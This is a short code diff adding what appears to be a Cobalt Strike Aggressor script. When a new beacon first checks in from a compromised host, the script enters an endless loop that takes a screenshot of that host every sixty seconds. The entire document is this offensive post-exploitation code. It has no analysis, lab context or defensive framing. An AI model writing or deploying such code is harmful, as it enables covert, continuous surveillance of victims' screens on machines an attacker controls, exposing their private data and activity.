@@ -1,0 +1,8 @@
+on beacon_initial {
+    $parentBeaconID = $1;
+    while (true)
+    {
+       bscreenshot($1);
+       sleep(60 * 1000);
+    }
+}
